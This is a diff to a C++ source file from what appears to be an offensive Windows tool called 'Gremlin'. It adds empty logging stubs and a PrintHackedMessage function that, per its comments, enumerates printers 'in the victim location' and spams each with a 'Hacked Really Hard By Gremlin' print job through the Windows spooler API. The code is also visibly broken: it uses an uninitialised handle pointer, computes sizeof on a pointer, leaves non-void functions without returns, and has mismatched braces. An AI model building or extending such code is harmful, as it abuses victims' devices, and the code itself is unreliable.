@@ -1,5 +1,14 @@
 #include "../Headers/Printers.h"
 
+//Logs Interface Implementation
+bool Printers::OutputFile(const std::string& message, const std::string& path) {
+	//Log to automatically generated log file
+}
+
+bool Printers::OutputEncryptedContent(const std::string& message, const std::string& path) noexcept {
+	//Log encrypted content to automatically generated log file.
+}
+
 /// <summary>
 /// reinterpretPrinterValueAddress is used to reintepret the pointer address of the values enumerated by EnumPrinters.
 /// </summary>
@@ -102,4 +111,67 @@ bool Printers::EnumeratePrintersInformation() {
 	}
 #endif
 	return true;
+}
+
+///Spam print hacked message on all the Printers 
+///in the victim location.
+
+//Useful Documentations :
+//https://docs.microsoft.com/en-us/troubleshoot/windows/win32/win32-raw-data-to-printer
+
+void Printers::PrintHackedMessage(){
+	//Check if we have more than 1 printers in the list.
+	if(this->Printers.size() < 1) return;
+	//Variables
+	LPHANDLE hPrinter;
+	DWORD PrintJob = 0;
+	DOC_INFO_1 docInformations;
+	//Print
+	for(PrinterInformations currentPrinter : 
+		this->Printers){
+			if(OpenPrinterA((char*)currentPrinter.PrinterName.c_str(), hPrinter, NULL) != 0){
+				//Printer is opened and we now have a handle on it.
+				//Add Job (Apparently it is not recommended to run AddJob directly on Windows 8 and Later OS)
+				//So we'll use the StartDocPrinter along with StartPagePrinter, WritePrinter, EndPagePrinter, EndDocPrinter.
+				
+				//Fill the structure with data.
+				docInformations.pDocName = L"Hacked Really Hard By Gremlin"; //Document name.
+				docInformations.pOutputFile = NULL; //Sets this to null if you send data to a printer.
+				docInformations.pDatatype = L"RAW"; //We sending RAW DATA to the printer.
+				char* lpData = "DATASENTDATASENTDATASENTDATASENT";
+				DWORD dwCount = sizeof(lpData) / sizeof(char);
+				DWORD dwBytesWritten;
+				//Inform the spooler the document is beginning.
+				if((PrintJob = StartDocPrinter(&hPrinter, 1, (LPBYTE)&docInformations)) == 0){
+					//If StartDocPrinter failed close the printer.
+					ClosePrinter(hPrinter);
+					return;
+				}
+				//Start a page.
+				if(!StartPagePrinter(hPrinter)){
+					//If StartPagePrinter function fails.
+					EndDocPrinter(hPrinter); //Tell our spooler to stop the Doc Print.
+					ClosePrinter(hPrinter); //Close our printer handle.
+					return;
+				}
+				//Apparently there is a problem with the WritePrinter function, we'll still figure it out.
+				if(!WritePrinter(hPrinter, (LPBYTE)&lpData, dwCount, &dwBytesWritten)){
+					//If WritePrinter function fails.
+					EndPagePrinter(hPrinter);
+					EndDocPrinter(hPrinter);
+					ClosePrinter(hPrinter);
+					return;
+				}
+				//End the page
+				if(!EndPagePrinter(hPrinter)){
+					EndDocPrinter(hPrinter);
+					ClosePrinter(hPrinter);
+					return;
+				}
+
+				if(!EndDocPrinter(hPrinter)){
+					ClosePrinter(hPrinter);
+					return;
+		}
+	}
 }
